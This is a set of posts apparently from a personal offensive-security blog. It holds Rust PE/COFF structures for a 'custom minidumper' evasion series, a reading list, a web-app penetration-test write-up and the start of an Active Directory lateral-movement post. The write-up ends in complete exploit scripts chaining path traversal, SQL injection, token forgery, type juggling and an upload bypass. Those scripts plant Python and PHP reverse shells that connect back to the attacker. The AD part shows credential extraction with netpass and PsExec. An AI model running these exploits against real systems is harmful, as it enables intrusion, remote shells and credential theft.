*const u32) } as usize; if str_table_len == 0 { return None; } Some(symbol.name.get_name(str_table_ptr)) } } /// COFF Symbol table (packed to prevent padding) #[repr(packed)] #[derive(Clone, Copy)] pub struct CoffSymbol { pub name: CoffSymbolName, pub value: u32, pub section_number: i16, pub type_: CoffSymbolType, pub storage_class: CoffSymbolStorageClass, pub number_of_aux_symbols: u8, } /// COFF symbol type #[derive(Clone, Copy, Debug)] #[repr(u16)] pub enum CoffSymbolType { ImageSymTypeNull = 0x0000, ImageSymTypeVoid = 0x0001, ImageSymTypeChar = 0x0002, ImageSymTypeShort = 0x0003, ImageSymTypeInt = 0x0004, ImageSymTypeLong = 0x0005, ImageSymTypeFloat = 0x0006, ImageSymTypeDouble = 0x0007, ImageSymTypeStruct = 0x0008, ImageSymTypeUnion = 0x0009, ImageSymTypeEnum = 0x000A, ImageSymTypeMoe = 0x000B, ImageSymTypeByte = 0x000C, ImageSymTypeWord = 0x000D, ImageSymTypeUint = 0x000E, ImageSymTypeDword = 0x000F, } /// COFF symbol storage class #[derive(Clone, Copy, Debug, Eq, PartialEq)] #[repr(u8)] pub enum CoffSymbolStorageClass { ImageSymClassEndOfFunction = 0xFF, ImageSymClassNull = 0x00, ImageSymClassAutomatic = 0x01, ImageSymClassExternal = 0x02, ImageSymClassStatic = 0x03, ImageSymClassRegister = 0x04, ImageSymClassExternalDef = 0x05, ImageSymClassLabel = 0x06, ImageSymClassUndefinedLabel = 0x07, ImageSymClassMemberOfStruct = 0x08, ImageSymClassArgument = 0x09, ImageSymClassStructTag = 0x0A, ImageSymClassMemberOfUnion = 0x0B, ImageSymClassUnionTag = 0x0C, ImageSymClassTypeDefinition = 0x0D, ImageSymClassUndefinedStatic = 0x0E, ImageSymClassEnumTag = 0x0F, ImageSymClassMemberOfEnum = 0x10, ImageSymClassRegisterParam = 0x11, ImageSymClassBitField = 0x12, ImageSymClassBlock = 0x64, ImageSymClassFunction = 0x65, ImageSymClassEndOfStruct = 0x66, ImageSymClassFile = 0x67, ImageSymClassSection = 0x68, ImageSymClassWeakExternal = 0x69, ImageSymClassClrToken = 0x6B, } #[repr(packed)] #[derive(Clone, Copy)] pub struct CoffSymbolName(pub [u8; 8]); impl CoffSymbolName { fn get_name(\u0026amp;self, str_table_ptr: usize) -\u0026gt; String { let name = \u0026amp;self.0[..]; if name[0] == 0 { let name_offset = u32::from_le_bytes(name[4..8].try_into().unwrap()); // name_offset + str_table_ptr = UTF8 null-terminated string let name_ptr = name_offset as usize + str_table_ptr; // convert name_ptr to null-terminated str // collect all bytes in name_ptr until null byte is reached let mut name_bytes = Vec::new(); loop { let byte = unsafe { *((name_ptr + name_bytes.len()) as *const u8) }; if byte == 0 { break; } name_bytes.push(byte); } // convert bytes to str // **unsafe, if object is corrupted // safety: remove unwrap + return Result return core::str::from_utf8(\u0026amp;name_bytes).unwrap().to_string(); } // convert first 8 bytes to a str let len = name.iter().position(|\u0026amp;c| c == 0).unwrap_or(name.len()); String::from_utf8_lossy(\u0026amp;name[..len]).to_string() } } // enum representing valid ImageFileMachine values #[derive(PartialEq, Eq, Clone, Copy)] #[repr(u16)] pub enum ImageFileMachine { // all possible Machine Types Unknown = 0x0, Am33 = 0x1d3, Amd64 = 0x8664, Arm = 0x1c0, Arm64 = 0xaa64, ArmNT = 0x1c4, Ebc = 0xebc, I386 = 0x14c, Ia64 = 0x200, M32R = 0x9041, Mips16 = 0x266, MipsFpu = 0x366, MipsFpu16 = 0x466, PowerPC = 0x1f0, PowerPCFP = 0x1f1, R4000 = 0x166, RiscV32 = 0x5032, RiscV64 = 0x5064, RiscV128 = 0x5128, SH3 = 0x1a2, SH3DSP = 0x1a3, SH4 = 0x1a6, SH5 = 0x1a8, Thumb = 0x1c2, WceMipsV2 = 0x169, } // constant representing a PE signature, e.g. \u0026#34;PE\\0\\0\u0026#34; pub const PE_SIGNATURE: u32 = u32::from_le_bytes(*b\u0026#34;PE\\0\\0\u0026#34;); #[derive(Copy, Clone)] #[repr(transparent)] pub struct PESignature(u32); // implement PESignature + verify sig is valid impl PESignature { pub fn is_valid(\u0026amp;self) -\u0026gt; bool { self.0 == PE_SIGNATURE } } // RVA32 is a relative virtual address to an underlying type #[derive(Copy, Clone, Default)] #[repr(transparent)] pub struct RVA32\u0026lt;T: ?Sized\u0026gt;(pub u32, pub core::marker::PhantomData\u0026lt;T\u0026gt;); // impl RVA32 with a function that adds usize base_address then derefs the pointer impl\u0026lt;T\u0026gt; RVA32\u0026lt;T\u0026gt; { pub fn get(\u0026amp;self, base_address: usize) -\u0026gt; \u0026amp;T { unsafe { \u0026amp;*((base_address + self.0 as usize) as *const T) } } pub fn get_mut(\u0026amp;mut self, base_address: usize) -\u0026gt; \u0026amp;mut T { unsafe { \u0026amp;mut *((base_address + self.0 as usize) as *mut T) } } } #[derive(Copy, Clone, Default)] #[repr(transparent)] pub struct RVA64\u0026lt;T: ?Sized\u0026gt;(pub u64, pub core::marker::PhantomData\u0026lt;T\u0026gt;); // impl RVA64 with function that adds usize base_address + then derefs the pointer impl\u0026lt;T\u0026gt; RVA64\u0026lt;T\u0026gt; { pub fn get(\u0026amp;self, base_address: usize) -\u0026gt; \u0026amp;T { unsafe { \u0026amp;*((base_address + self.0 as usize) as *const T) } } pub fn get_mut(\u0026amp;mut self, base_address: usize) -\u0026gt; \u0026amp;mut T { unsafe { \u0026amp;mut *((base_address + self.0 as usize) as *mut T) } } } #[derive(Copy, Clone, Debug)] #[repr(C)] pub struct UnicodeString { pub length: u16, pub maximum_length: u16, pub buffer: *const u16, } // impl Default for UnicodeString impl Default for UnicodeString { fn default() -\u0026gt; Self { Self { length: 0, maximum_length: 0, buffer: core::ptr::null(), } } } impl UnicodeString { // convert buffer to utf16 string based on length field pub fn extract_string(\u0026amp;self) -\u0026gt; Option\u0026lt;String\u0026gt; { if self.length == 0 || self.buffer as *const _ as usize == 0 { return None; } let slice = unsafe { slice::from_raw_parts(self.buffer, self.length as usize / 2) }; // convert slice to String core::char::decode_utf16(slice.iter().cloned()) .collect::\u0026lt;Result\u0026lt;String, _\u0026gt;\u0026gt;() .ok() } } now that we\u0026rsquo;ve mapped + define the structures and layouts of a PE file, as well as how to handle RVAs, we can move ahead with writing our custom minidumper! stay tuned for part 2.\n","date":"2024-10-07","permalink":"//localhost:1313/posts/minidump-pe/","section":"","summary":"","tags":[],"title":"advanced evasions, part 1: PE maps + custom minidumpers"},{"categories":[],"contents":"currently reading [+] topology of violence by byung chul han [+] blue fox: ARM assembly internals and reverse engineering by maria azeria markstedter [+] applied cryptography: protocols, algorithms, and source code in C by bruce schneier [+] the wretched of the earth by frantz fanon completed [2024] [+] the poetics of space by gaston bachelard [+] revolutionary demonology by gruppo di nun [+] the messianic reduction: walter benjamin and the shape of time by peter fenves [+] intelligence and spirit by reza negarestani [+] define and rule: native as political identity by mahmood mamdani [+] aberration in the heartland of the real by wendy s. painting [+] palestine by joe sacco [+] the cuckoo\u0026rsquo;s egg: tracking a spy through the maze of computer espionage by clifford stoll [+] the three body problem by cixin liu [+] the art of doing science and engineering: learning to learn by richard hamming [+] inside deep learning: math, algorithms, models by edward raff queue [+] solenoid by mircea cartarescu [+] the storm before the storm: the beginning of the end of the roman republic by mike duncan [+] elite capture: how the powerful took over identity politics (and everything else) by olufemi o. taiwo [+] septology by jon fosse [+] 2666 by roberto bolano [+] melancholy by jon fosse [+] the space of literature by maurice blanchot [+] the invention of the white race: the origin of racial oppression by theodore w. allen [+] the power of ritual in prehistory: secret societies and origins of social complexity by brian hayden [+] the ladder of lights by william g. gray completed [2023] [+] museum of innocence by orhan pamuk [+] the passenger by cormac mccarthy [+] the shadow king by maaza mengiste [+] blood meridian, or, the evening redness in the west by cormac mccarthy [+] non-things: upheaval in the lifeworld by byung-chul han [+] cyclonopedia: complicity with anonymous materials by reza negarestani [+] programmed to kill: the politics of serial murder by mark mcgowan [+] gandhi and philosophy: on theological anti-politics by divya dwivedi and shaj mohan [+] sufi deleuze by micheal muhammad knight [+] telluria by vladimir sorokin [+] gravity\u0026rsquo;s rainbow by thomas pynchon [+] figured stones: exploring the lithic imaginary by paul prudence [+] the vanishing by tim krabbe [+] relentless pursuit: my fight for the victims of jeffery epstein and ghislaine maxwell by bradley edwards [+] the dhammapada by eknath easwaran [+] the conspiracy against the human race by thomas ligotti [+] querelle of brest by jean genet [+] temporary people by deepak unnikrishnan [+] war and peace by leo tolstoy [+] the knot by michael gira [+] when we cease to understand the world by benjamin labatut [+] the three stigmata of palmer eldritch by philip k. dick ","date":"2024-10-07","permalink":"//localhost:1313/posts/new_post10/","section":"","summary":"","tags":[],"title":"reading list [updated]"},{"categories":[],"contents":"during a recent penetration test, i encountered two linked web apps that i thought would be good case studies for a blog post. let\u0026rsquo;s call them Ren + Stimpy.\nRen is a custom-built web app, designed to manage user interactions + content. users can upload/download content, manager user roles, and interact with the database in the backend.\nStimpy handles uploaded invoices and user accounts, dealing with a variety of file uploads.\nas you\u0026rsquo;ll see, i was able to chain together path traversal, SQL injection, arbitrary file uploads, and type juggling attacks to achieve RCE [Remote Code Execution], and how i assembled the full exploit script piece-by-piece.\nRen analyzing download i began by analyzing the download functionality in Ren.\n@GetMapping({\u0026#34;/download\u0026#34;}) public ResponseEntity\u0026lt;byte[]\u0026gt; getImage(@RequestParam(\u0026#34;id\u0026#34;) String id) { try { byte[] image = this.downloadService.getPDF(id.replace(\u0026#34;../\u0026#34;, \u0026#34;\u0026#34;)); HttpHeaders headers = new HttpHeaders(); headers.add(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=ren.pdf\u0026#34;); headers.add(\u0026#34;Cache-Control\u0026#34;, \u0026#34;no-cache, no-store\u0026#34;); return ((BodyBuilder)ResponseEntity.ok().headers(headers)).contentType(MediaType.APPLICATION_PDF).body(image); } catch (Exception var4) { logger.error(var4.getMessage()); return ResponseEntity.notFound().build(); } } this function attempts to filter out path elements like ../, but this can be bypassed. it filters out ../ from the id parameter, but it doesn\u0026rsquo;t account for bypasses like ..././, which can allow attackers to access files outside the intended directory.\ninjecting a crafted path by injecting a crafted path (..././), i was able to retrieve the file config/uuid, that contained an encryption key used to secure tokens.\nuuid = session.get(target + \u0026#39;/download?id=..././conf/uuid\u0026#39;).text SQLi: /admin/users/category?id= next, i analyzed the administrative functionality. there\u0026rsquo;s a rather glaring SQL injection vulnerability in the /admin/users/category?id= parameter.\npublic List\u0026lt;User\u0026gt; getUsersWithPostsInCategory(String categoryId) throws Exception { String sql = \u0026#34;SELECT u.id, u.username, \u0026#39;***\u0026#39; as password, u.isAdmin, u.isActive, u.email \u0026#34; + \u0026#34;FROM users u LEFT OUTER JOIN stories s ON s.owner_id = u.id \u0026#34; + \u0026#34;LEFT OUTER JOIN categories c ON s.category_id = c.id WHERE s.category_id = \u0026#34; + categoryId; return this.template.query(sql, new UserRowMapper()); } reverse shell payload this query dynamically inserts categoryId without any sanitization. using a stacked SQL query, i injected a reverse shell payload that would connect back to my machine, giving me full remote access to the server.\nb64payload = base64.b64encode(f\u0026#39;\u0026#39;\u0026#39; import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\u0026#34;{IP}\u0026#34;, 5555)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn(\u0026#34;/bin/bash\u0026#34;) \u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)) session.get(target + \u0026#34;/admin/users/category?id=1; COPY(SELECT convert_from(decode(\u0026#39;\u0026#34; + b64payload.decode(\u0026#39;utf-8\u0026#39;) + \u0026#34;\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;utf-8\u0026#39;)) to \u0026#39;/tmp/shell.py\u0026#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \u0026#39;python3 /tmp/shell.py\u0026#39;;\u0026#34;) socket.socket() creates a new network socket, and s.connect() makes the target connect to my IP address over port 5555. os.dup() redirect the standard input, output, and error file descriptors (0, 1, 2) to the socket s. any command executed on the target will be sent back to me via the socket.\npty.spawn() spawns a bash shell, which gives me an interactive command-line session on the target. encoding everything in base64 just means i can transmit binary/special characters as plaintext.\nthe target URL /admin/users/category?id=1 is vulnerable to SQL injection via stacked queries. this means i can append + execute additional SQL commands after the legitimate query.\nthe base64-encoded payload is injected into the SQL query via id, after which the query decodes the payload back to the original Python code, and writes the decoded payload to a temporary file /tmp/shell.py on the server, using COPY (PostgreSQL).\nonce the payload is in /tmp/shell.py, the SQL injection creates + runs the reverse shell by executing COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py'. this allows the execution of external programs, running the shell script on the target. the commands DROP TABLE IF EXISTS cmd_exec and CREATE TABLE cmd_exec are just regular commands used to create temporary tables. i included them just to make the query structure valid in PostgreSQL.\nStimpy bypassing file blacklists now that Ren\u0026rsquo;s fully compromised, i turned my attention to Stimpy. the first vulnerability i found was in the file upload functionality.\npublic function importInvoices($request, $response) { $user = $this-\u0026gt;container[\u0026#39;auth\u0026#39;]-\u0026gt;user(); $directory = $this-\u0026gt;container-\u0026gt;settings[\u0026#39;importDirectory\u0026#39;]; $uploadedFiles = $request-\u0026gt;getUploadedFiles(); $uploadedFile = $uploadedFiles[\u0026#39;file\u0026#39;]; if ($uploadedFile-\u0026gt;getError() === UPLOAD_ERR_OK) { $filename = $uploadedFile-\u0026gt;getClientFilename(); $f_validation = $this-\u0026gt;container-\u0026gt;validator-\u0026gt;validate([ \u0026#34;filename\u0026#34; =\u0026gt; $filename ], [ \u0026#39;filename\u0026#39; =\u0026gt; v::alnum(\u0026#39;.\u0026#39;) ]); if ($f_validation-\u0026gt;failed()) { return $this-\u0026gt;container-\u0026gt;helper-\u0026gt;error($f_validation-\u0026gt;errors, $response); } if (in_array(pathinfo($filename, PATHINFO_EXTENSION), $this-\u0026gt;container-\u0026gt;settings[\u0026#39;restrictedExt\u0026#39;])) { return $this-\u0026gt;container-\u0026gt;helper-\u0026gt;error([\u0026#34;Invalid Extension\u0026#34; =\u0026gt; [\u0026#34;Extension is not allowed\u0026#34;]], $response); } } } it attempts to block dangerous file extensions using a blacklist: restrictedExt.\nhowever, the list isn\u0026rsquo;t exhaustive.\n\u0026#39;restrictedExt\u0026#39; =\u0026gt; [\u0026#39;php\u0026#39;, \u0026#39;php2\u0026#39;, \u0026#39;php3\u0026#39;, \u0026#39;php4\u0026#39;, \u0026#39;php5\u0026#39;, \u0026#39;phtml\u0026#39;, \u0026#39;exe\u0026#39;, \u0026#39;asp\u0026#39;, \u0026#39;cgi\u0026#39;, \u0026#39;vbs\u0026#39;, \u0026#39;pl\u0026#39;, \u0026#39;com\u0026#39;] exploiting this is a three-part process. first, i have to upload the .htaccess file. this file contains Apache rewrite rules that allow execution of files with a .php6 extension. this will bypass the restricted file extensions.\nnext, i\u0026rsquo;ll have to upload a PHP reverse shell shell.php6. like the shell in Ren, this will connect back to my machine on a specified IP and port.\nfinally, i\u0026rsquo;ll have to execute. this will be done by sending a GET request to the uploaded shell script /imports/shell.php.\n# upload .htaccess file to enable execution of PHP files with unusual extensions session.post(target + \u0026#39;/import\u0026#39;, files={\u0026#39;file\u0026#39;: (\u0026#39;.htaccess\u0026#39;, \u0026#39;RewriteEngine on\\nRewriteRule shell.php shell.php6\u0026#39;)}) # upload reverse shell in PHP session.post(target + \u0026#39;/import\u0026#39;, files={\u0026#39;file\u0026#39;: (\u0026#39;shell.php6\u0026#39;, f\u0026#39;\u0026lt;?php $s=fsockopen(\u0026#34;{my_ip}\u0026#34;,4444); $p=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$s, 1=\u0026gt;$s, 2=\u0026gt;$s), $pipes); ?\u0026gt;\u0026#39;)}) # execute the uploaded reverse shell session.get(target + \u0026#39;/imports/shell.php\u0026#39;) type juggling now that i\u0026rsquo;ve abused the lax file extension restrictions, i can move on to the next vulnerability. i noticed a flaw in the password reset mechanism: type juggling. this allows an attacker to bypass the password reset token check and reset the administrator\u0026rsquo;s password.\npublic function checkResetLink($userId, $time, $sig) { $user = User::find($userId); if (empty($user-\u0026gt;resetToken)) { return false; } else { return $this-\u0026gt;generateSig($user-\u0026gt;id, $user-\u0026gt;resetToken, $time, $user-\u0026gt;password) == $sig; } } public function generateSig($id, $resetToken, $time, $password) { return substr(hash(\u0026#34;sha256\u0026#34;, $id . \u0026#34;|\u0026#34; . $resetToken . \u0026#34;|\u0026#34; . $time . \u0026#34;|\u0026#34; . $password), 0, 8); } the reset token is being compared using a weak comparison operator ==. weak comparison can treat two values as equal if they evaluate to the same number, even when they\u0026rsquo;re strings. hence, i can \u0026ldquo;force\u0026rdquo; a comparison to return true by using a magic hash. for example, the string 0e123456 is considered 0 when evaluated as a number. if the reset token on the server is also weakly compared and happens to be evaluated as 0, i can bypass the token check!\ni created two functions for the exploit: ResetLink() and Test(). ResetLink() sends a password reset request to the server using the forgot password endpoint. it submits the admin email to initiate the reset process.\nTest() checks if the server accepts the password reset link by making a GET request to a URL crafted with a timestamp ts and the magic hash 0e123456. hopefully, it will be interpreted as scientific notation and lead to a false positive.\ndef ResetLink(): session.post(target + \u0026#39;/forgot\u0026#39;, data={\u0026#39;email\u0026#39;: email}) def Test(): resp = session.get(f\u0026#39;{target}/reset/1/{ts}/0e123456\u0026#39;) if \u0026#34;Reset your password below\u0026#34; in resp.text: return True else: return False all i need to do now is to repeatedly request a password reset link using the admin\u0026rsquo;s email. the Test() function will check if the magic hash URL is accepted, and, if so, a new password will be submitted, along with a confirmation of success.\nwhile True: ResetLink() if Test(): session.post(f\u0026#39;{target}/reset/1/{ts}/0e123456\u0026#39;, data={\u0026#39;password\u0026#39;:password}) print(\u0026#39;hell yeah brother!\u0026#39;) break privilege escalation the final step is privilege escalation. recall the path traversal exploit that allowed me to retrieve the config/uuid file. the UUID is a critical piece because it\u0026rsquo;s the key to decrypting/encrypting session tokens. let\u0026rsquo;s take a look at the Tokenizer.java class that i\u0026rsquo;ll exploit.\npublic class Tokenizer { public static String decryptToken(String user, String token, String uuid) { try { SecretKey key = getKeyForUser(user, uuid); Cipher cipher = Cipher.getInstance(\u0026#34;DESede/ECB/PKCS5Padding\u0026#34;); cipher.init(Cipher.DECRYPT_MODE, key); byte[] enc = Base64.getUrlDecoder().decode(token.getBytes(\u0026#34;UTF-8\u0026#34;)); byte[] plain = cipher.doFinal(enc); return new String(plain, \u0026#34;UTF-8\u0026#34;); } catch (Exception e) { e.printStackTrace(); return \u0026#34;\u0026#34;; } } public static String encryptToken(String user, String token, String uuid) { try { SecretKey key = getKeyForUser(user, uuid); Cipher cipher = Cipher.getInstance(\u0026#34;DESede/ECB/PKCS5Padding\u0026#34;); cipher.init(Cipher.ENCRYPT_MODE, key); byte[] enc = cipher.doFinal(token.getBytes(\u0026#34;UTF-8\u0026#34;)); return Base64.getUrlEncoder().encodeToString(enc); } catch (Exception e) { e.printStackTrace(); return \u0026#34;\u0026#34;; } } private static SecretKey getKeyForUser(String email, String uuid) throws Exception { MessageDigest md = MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;); String keyText = uuid + email; byte[] keyArray = new byte[24]; System.arraycopy(md.digest(keyText.getBytes(\u0026#34;UTF-8\u0026#34;)), 0, keyArray, 0, 24); return new SecretKeySpec(keyArray, \u0026#34;DESede\u0026#34;); } } the decryptToken() method is used to decrypt the session token from the user\u0026rsquo;s session cookie. the UUID is combined with the user\u0026rsquo;s email to create a 3DES encryption key using the getKeyForUser() method. this key is then used to decrypt the session token (which contains information about the user\u0026rsquo;s privileges, like their role).\nhere\u0026rsquo;s the annotated code, so you can understand what\u0026rsquo;s going on under the hood.\npublic static String decryptToken(String user, String token, String uuid) { try { SecretKey key = getKeyForUser(user, uuid); // generate the decryption key Cipher cipher = Cipher.getInstance(\u0026#34;DESede/ECB/PKCS5Padding\u0026#34;); // set up the 3DES cipher cipher.init(Cipher.DECRYPT_MODE, key); // initialize the cipher for decryption byte[] enc = Base64.getUrlDecoder().decode(token.getBytes(\u0026#34;UTF-8\u0026#34;)); // decode the base64 token byte[] plain = cipher.doFinal(enc); // decrypt the token return new String(plain, \u0026#34;UTF-8\u0026#34;); // return the plaintext token } catch (Exception e) { e.printStackTrace(); return \u0026#34;\u0026#34;; } } private static SecretKey getKeyForUser(String email, String uuid) throws Exception { MessageDigest md = MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;); String keyText = uuid + email; // concatenate the UUID + email byte[] keyArray = new byte[24]; // 3DES key size System.arraycopy(md.digest(keyText.getBytes(\u0026#34;UTF-8\u0026#34;)), 0, keyArray, 0, 24); // generate the key return new SecretKeySpec(keyArray, \u0026#34;DESede\u0026#34;); // return the 3DES key } the getKeyForUser() method generates a decryption key by concatenating the UUID and the email, hashes it using SHA-256, and truncates the result to 24 bytes (the length needed for 3DES). the 3DES cipher is initialized using the generated key, and the token is decrypted and returned as a plain text string.\nonce the token is decrypted, i can modify the role within it to escalate my privileges. all i have to do is append the |1 flag (1 represents admin status) to the token and re-encrypt it, using the same UUID and the target email.\npublic static String encryptToken(String user, String token, String uuid) { try { SecretKey key = getKeyForUser(user, uuid); // generate the encryption key Cipher cipher = Cipher.getInstance(\u0026#34;DESede/ECB/PKCS5Padding\u0026#34;); cipher.init(Cipher.ENCRYPT_MODE, key); // initialize the cipher for encryption byte[] enc = cipher.doFinal(token.getBytes(\u0026#34;UTF-8\u0026#34;)); // encrypt the token return Base64.getUrlEncoder().encodeToString(enc); // return the base64-encoded encrypted token } catch (Exception e) { e.printStackTrace(); return \u0026#34;\u0026#34;; } } here are the complete exploits for both Ren + Stimpy!\nexploit: Ren goal: get admin access + execute RCE, using path traversal, token manipulation, and SQL injection.\nimport requests import time import string import subprocess import base64 import random import sys # step 1: set up my IP and target URL my_ip = sys.argv[1] # attacker IP address is passed as an argument target = \u0026#39;http://\u0026lt;IP\u0026gt;\u0026#39; # target application URL # step 2: generate random username + email username = \u0026#39;\u0026#39;.join(random.choice(string.ascii_lowercase) for c in range(3)) email = username + \u0026#39;@ren.local\u0026#39; # email with the generated username # step 3: initialize session and get main page session = requests.Session() session.get(target + \u0026#39;/\u0026#39;) # target\u0026#39;s homepage # step 4: create an account on the target application session.post(target + \u0026#39;/signup\u0026#39;, data={ \u0026#39;submit\u0026#39;: \u0026#39;Submit\u0026#39;, \u0026#39;email\u0026#39;: email, \u0026#39;password\u0026#39;: \u0026#39;L0r3m1p$uM\u0026#39;, \u0026#39;username\u0026#39;: username }) # step 5: log in and capture the \u0026#39;rememberme\u0026#39; session token session.post(target + \u0026#39;/login\u0026#39;, data={ \u0026#39;submit\u0026#39;: \u0026#39;Submit\u0026#39;, \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: \u0026#39;L0r3m1p$uM\u0026#39;, \u0026#39;rememberme\u0026#39;: True # remember me token is stored in the session }) myuser_token = session.cookies.get_dict()[\u0026#34;rememberme\u0026#34;] # extract the rememberme token # step 6: exploit path traversal vulnerability to retrieve UUID uuid = session.get(target + \u0026#39;/download?id=..././conf/uuid\u0026#39;).text # UUID is the encryption key # step 7: decrypt the token, modify it to escalate privileges, and re-encrypt process = subprocess.Popen([\u0026#39;java\u0026#39;, \u0026#39;Tokenizer\u0026#39;, myuser_token, email, \u0026#39;admin@ren.local\u0026#39;, uuid], stdout=subprocess.PIPE) time.sleep(5) # wait for subprocess to complete out, err = process.communicate() # step 8: if there\u0026#39;s an error, print it and exit if err: print(err) exit() # step 9: retrieve the admin token from the output tokenadmin = out.decode(\u0026#34;UTF-8\u0026#34;) # step 10: log in as admin using the manipulated token session.get(target + \u0026#39;/login\u0026#39;, cookies={\u0026#39;rememberme\u0026#39;: tokenadmin}) # step 11: craft the reverse shell payload and encode it in base64 b64payload = base64.b64encode(f\u0026#39;\u0026#39;\u0026#39; import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\u0026#34;{my_ip}\u0026#34;, 4444)); # Connect to my IP os.dup2(s.fileno(), 0); # Redirect stdin os.dup2(s.fileno(), 1); # Redirect stdout os.dup2(s.fileno(), 2); # Redirect stderr pty.spawn(\u0026#34;/bin/bash\u0026#34;) # Spawn a bash shell \u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)) # step 12: exploit SQL injection vulnerability to run the reverse shell session.get(target + \u0026#34;/admin/users/category?id=1; COPY(SELECT convert_from(decode(\u0026#39;\u0026#34; + b64payload.decode(\u0026#39;utf-8\u0026#39;) + \u0026#34;\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;utf-8\u0026#39;)) to \u0026#39;/tmp/shell.py\u0026#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \u0026#39;python3 /tmp/shell.py\u0026#39;;\u0026#34;) exploit: Stimpy goal: gain admin access + RCE using type juggling and arbitrary file upload.\nimport requests import re import time import sys # step 1: set up my IP and target URL my_ip = sys.argv[1] # IP target = \u0026#34;http://\u0026lt;IP\u0026gt;\u0026#34; # target URL # step 2: admin account details email = \u0026#34;admin@stimpy.tld\u0026#34; # admin email to target password = \u0026#39;L0r3m1p$uM\u0026#39; # new admin password to set ts = int(time.time()) # generate timestamp for the reset link # step 3: initialize session and open target\u0026#39;s homepage session = requests.Session() session.get(target) # step 4: function to request a password reset link def ResetLink(): session.post(target + \u0026#39;/forgot\u0026#39;, data={\u0026#39;email\u0026#39;: email}) # step 5: function to test if reset token is valid using type juggling def Test(): resp = session.get(f\u0026#39;{target}/reset/1/{ts}/0e123456\u0026#39;) # type juggling with magic hash if \u0026#34;Reset your password below\u0026#34; in resp.text: return True # success, token accepted else: return False # try again # step 6: brute force magic hash and change admin password while True: ResetLink() # request password reset link if Test(): # check if reset link is accepted session.post(f\u0026#39;{target}/reset/1/{ts}/0e123456\u0026#39;, data={\u0026#39;password\u0026#39;: password}) # reset password print(\u0026#39;hell yeah brother!\u0026#39;) # success message break # step 7: log in as admin using the new password session.post(target + \u0026#39;/login\u0026#39;, data={\u0026#39;email\u0026#39;: email, \u0026#39;password\u0026#39;: password}) # step 8: exploit arbitrary file upload to gain RCE # upload .htaccess to allow execution of PHP files with unusual extensions session.post(target + \u0026#39;/import\u0026#39;, files={\u0026#39;file\u0026#39;: (\u0026#39;.htaccess\u0026#39;, \u0026#39;RewriteEngine on\\nRewriteRule shell.php shell.php6\u0026#39;)}) # step 9: upload reverse shell as PHP6 file session.post(target + \u0026#39;/import\u0026#39;, files={\u0026#39;file\u0026#39;: (\u0026#39;shell.php6\u0026#39;, f\u0026#39;\u0026lt;?php $s=fsockopen(\u0026#34;{my_ip}\u0026#34;, 4444); $p=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$s, 1=\u0026gt;$s, 2=\u0026gt;$s), $pipes); ?\u0026gt;\u0026#39;)}) # step 10: execute the reverse shell session.get(target + \u0026#39;/imports/shell.php\u0026#39;) ","date":"2024-09-29","permalink":"//localhost:1313/posts/sunday-scaries/","section":"","summary":"","tags":[],"title":"sunday scaries: exploiting web apps"},{"categories":[],"contents":"in part 1, i covered the first act of the post-exploitation phase, pivoting from the user workstation to the UAT server and then the dev server. in this part, i\u0026rsquo;ll use the privileges gleaned from the dev server to pivot to the production server, the child domain controller, and, finally, the forest root domain controller.\ntarget 4 the production server prodsrv.nebula.cosmos.local, contains arguably the most valuable data for an operation. it hosts live applications, which could be an e-commerce platform, CRM system, or another business-critical app.\nwhile security is tighter here, production environments can still fall victim to misconfigurations. hence, i\u0026rsquo;m going to chain together multiple vulnerabilities, from scheduled task abuse to service exploitation.\nscheduled task exploitation during the enumeration phase, i discovered that the devmanager user account was associated with scheduled tasks.\nPS C:\\AD\\tools\u0026gt; . .\\Powerview.ps1 PS C:\\AD\\tools\u0026gt; Get-NetUser | Select-Object userprincipalname,description | ft -wrap userprincipalname description ----------------- ----------- Built-in account for administering the computer/domain Built-in account for guest access to the computer/domain A user account managed by the system Key Distribution Center Service Account data@nebula.cosmos.local reportuser devsqladmin uatadmin prodadmin serviceacct employeeuser devmanager Please use this for running scheduled tasks upon accessing the Devsrv.nebula.cosmos.local machine as employeeuser, i navigated to C:\\Windows\\system32\\Tasks and found a SQLServerChecker task. to exploit this, i executed the following:\nSchtasks /RUN /TN \u0026#34;SQLServerChecker\u0026#34; extracting credentials extracting credentials from scheduled tasks is possible because Credential Manager stores the credentials on disk and protected by DPAPI. a program running as that specific user will be able to access credentials in this store.\nusing PSExec to run netpass, it\u0026rsquo;s possible to retrieve the saved passwords. in this case, it\u0026rsquo;s possible to extract the credentials for the devmanager account.\n.\\PSExec64.exe -i -s -d C:\\Windows\\system32\\Tasks\\netpass.exe PsExec could not start C:\\Windows\\System32\\Tasks\\netpass.exe on DEVSRV: The system cannot find the file specified. PS C:\\Windows\\system32\\Tasks\u0026gt; ls Directory: C:\\Windows\\system32\\Tasks Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/24/2024 9:33 PM Microsoft -a---- 5/18/2024 5:29 AM 2530060 Invoke-Mimikatz.ps1 -a---- 4/14/2024 2:22 AM 138752 netpass.exe ------ 5/25/2024 4:40 PM 1078672 PsExec64.exe -a---- 10/22/2023 4:41 AM 3518 SQLServerChecker PS C:\\Windows\\system32\\Tasks\u0026gt; .\\PsExec64.exe -i -s -d \u0026#39;C:\\Windows\\System32\\Tasks\\netpass.exe\u0026#39; PsExec v2.34 - Execute processes remotely Copyright (C) 2001-2024 Mark Russinovich Sysinternals - www.sysinternals.com C:\\Windows\\System32\\Tasks\\netpass.exe started on DEVSRV with process ID 